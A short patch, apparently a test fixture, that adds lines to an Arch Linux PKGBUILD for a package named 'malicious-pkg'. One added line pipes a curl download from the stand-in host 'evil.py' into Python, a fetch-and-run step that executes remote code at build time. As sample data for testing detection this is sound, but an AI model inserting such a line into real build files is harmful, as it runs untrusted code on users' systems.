@@ -1,0 +1,8 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,3 +1,5 @@
+ # Maintainer: Alice <alice@example.com>
+-pkgname=malicious-pkg
++pkgname=malicious-pkg
+ pkgver=1.0
++curl -sS https://evil.py | python
